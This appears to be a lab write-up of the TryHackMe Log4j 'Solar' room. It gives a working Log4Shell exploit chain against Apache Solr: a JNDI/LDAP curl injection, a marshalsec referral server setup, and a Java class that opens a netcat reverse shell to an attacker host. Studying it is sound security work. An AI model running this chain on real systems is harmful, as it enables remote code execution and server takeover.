# Log4j
https://tryhackme.com/room/solar

## What makes it dangerous?
1. easy to exploit
2. abundant
3. gives remote code execution

## What features are exploited in Log4j?
1. JNDI
2. Support for message lookups

## What are the apps affected so far?
https://github.com/YfryTchsGD/Log4jAttackSurface

## what are more resources to check on the vuln?
https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
https://log4shell.huntress.com/
https://www.youtube.com/watch?v=7qoPDq41xhQ

## investigating the apache solr logs
`/vas/solr/logs/solr.log`


## by viewing the logs:
`2021-12-13 04:01:58.351 INFO  (qtp1083962448-23) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0`
## we notice that there's an HTTP solr call in the path `/admin/cores` and the params are empty braces where user input can be injected and evaluated as code

## Example statments that can be evaluated:
- `${sys:os.name}`
- `${sys:user.name}`
- `${log4j:configParentLocation}`
- `${ENV:PATH}`
- `${ENV:HOSTNAME}`
- `${java:version}`

## the payload however leverages the JNDI (Java Naming & Directory Interface) which can access external resources
`{JNDI:LDAP://<ATTACKERCONTROLLEDHOST>}`

## Question is: what location can we use this payload?
## the answer is: ANYWHERE that's logged by log4j
- Input user/password login forms
- Data entry points in the application
- HTTP Headers like User-Agent, X-Forwarded-For or other headers

*In short: any place for user-supplied data*

## More information on JNDI Attack vector
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

## Checking if the vuln exists, we run a curl
`curl 'http://<VICTIM>:8983/solr/admin/cores?edelo=$\{jndi:ldap://<LHOST>:<LPORT>\}'`
## we get a connection back on our listening port
![Log4J Detection](Log4J-Detection.jpg)

## the response was ugly because our netcat listener wasn't a proper **LDAP handler**
## will use a special server called **LDAP Referral Server** (https://github.com/mbechler/marshalsec) to redirect the request from the victim machine somwhere else where we host our **Mailicous Java Code**

## Steps should be as below:
1. `${jndi:ldap://<ATTACKER-IP>:1389/Resource}` --> request to our LDAP referral server
2. LDAP server *bounces* the request over to our http server hosting the java malicious `.class` file
3. class file gets executed and we get our reverse shell

## Youtube video of the attack demo
https://youtu.be/OJRqyCHheRE

## Building the LDAP Referral server
1. update apt
`apt update -y`
2. install maven
`apt install maven -y`
3. clone marshalsec repository
`git clone https://github.com/mbechler/marshalsec.git`
4. build the **martialsec** utility:
`mvn clean package -DskipTests`

## we now start the ldap server taking note to set the variables to point to our HTTP server where the evil payload will be hosted :D
`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<ATTACK-IP>:8000/#Exploit"`
## The server should be listening like the screenshot below:
![LDAP Server Listening](LDAP-Referral-Server-Listening.jpg)

## we will create a java payload that sends a reverse shell back to our attacker machine
## code is as below:
```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <ATTACKER-IP> <ATTACKER-PORT>");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
## we save the file as `Exploit.java`
## **The above step is importatnt** to make sure the payload matches what we specified in the LDAP referral server:
`marshalsec.jndi.LDAPRefServer "http://<ATTACK-IP>:8000/#Exploit"` <-- note the `#Exploit` name

## we proceed to install java development kit
`apt install default-jdk -y`

## then move on to compile the `Exploit.java` file to get the malicious `Exploit.class` file
`javac Exploit.java -source 8 -target 8`

## we then set up our python http server to host our payload
`python3 -m http.server`

## and we invoke our curl
`curl 'http://<VICTIM-IP>:8983/solr/admin/cores?foo=$\{jndi:ldap://<ATTACKER-IP>:1389/Exploit\}'`

## The attack chain should be like the below image:
![Log4j Exploitation Sequence](Log4j-Exploitation-Sequence.jpg)